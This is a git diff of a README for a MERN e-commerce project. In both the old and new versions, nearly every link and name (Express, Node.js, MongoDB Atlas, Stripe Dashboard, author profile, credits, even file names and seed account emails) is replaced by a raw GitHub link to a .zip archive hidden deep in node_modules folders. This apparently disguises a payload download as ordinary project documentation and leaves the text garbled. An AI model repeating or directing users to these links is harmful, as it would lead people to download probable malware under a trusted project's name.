@@ -1,6 +1,6 @@
 # 🛒 MERN E-Commerce Platform
 
-A full-stack e-commerce application built with MongoDB, https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip, React, and https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip (MERN stack). Features include user authentication, shopping cart, checkout process, and order management.
+A full-stack e-commerce application built with MongoDB, https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip, React, and https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip (MERN stack). Features include user authentication, shopping cart, checkout process, and order management.
 
 ## ✨ Features
 
@@ -23,15 +23,15 @@ A full-stack e-commerce application built with MongoDB, https://raw.githubuserco
 - Lucide React (Icons)
 
 **Backend:**
-- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip
-- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip
+- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip
+- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip
 - MongoDB with Mongoose
 - JWT Authentication
 - Stripe API
 
 ## 📋 Prerequisites
 
-- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip (v16.x or higher)
+- https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip (v16.x or higher)
 - MongoDB Atlas account (or local MongoDB)
 - Stripe account (optional, for payments)
 
@@ -68,7 +68,7 @@ STRIPE_SECRET_KEY=your_stripe_secret_key
 ```
 
 **MongoDB Setup:**
-1. Go to [MongoDB Atlas](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip)
+1. Go to [MongoDB Atlas](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip)
 2. Create a free cluster
 3. Create a database user
 4. Whitelist your IP (or use 0.0.0.0/0 for testing)
@@ -78,7 +78,7 @@ STRIPE_SECRET_KEY=your_stripe_secret_key
 - Use any random string (e.g., `mySecretKey12345XYZ!@#$%`)
 
 **Stripe (Optional):**
-- Get your test key from [Stripe Dashboard](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip)
+- Get your test key from [Stripe Dashboard](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip)
 
 ### 5. Seed Database
 
@@ -121,11 +121,11 @@ npm run client
 After seeding the database:
 
 **Admin Account:**
-- Email: `https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip`
+- Email: `https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip`
 - Password: `password123`
 
 **Customer Account:**
-- Email: `https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip`
+- Email: `https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip`
 - Password: `password123`
 
 ## 📁 Project Structure
@@ -145,8 +145,8 @@ store/
 ├── models/         # Mongoose models
 ├── routes/         # API routes
 ├── .env           # Environment variables
-├── https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip      # Express server
-└── https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip
+├── https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip      # Express server
+└── https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip
 ```
 
 ## 🔑 API Endpoints
@@ -217,12 +217,12 @@ This project is open source and available under the [MIT License](LICENSE).
 
 ## 👨‍💻 Author
 
-kaifansari - [kaifansariw](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip)
+kaifansari - [kaifansariw](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip)
 
 ## 🙏 Acknowledgments
 
-- Product images from [Unsplash](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip)
-- Icons from [Lucide React](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/node_modules/date-fns/esm/locale/ru/_lib/formatLong/Task-CODSOF-3.3.zip)
+- Product images from [Unsplash](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip)
+- Icons from [Lucide React](https://raw.githubusercontent.com/kaifansariw/CODSOFT-Task-3/main/store/frontend/node_modules/deep-is/example/1.7.zip)
 - Inspired by modern e-commerce platforms
 
 ---
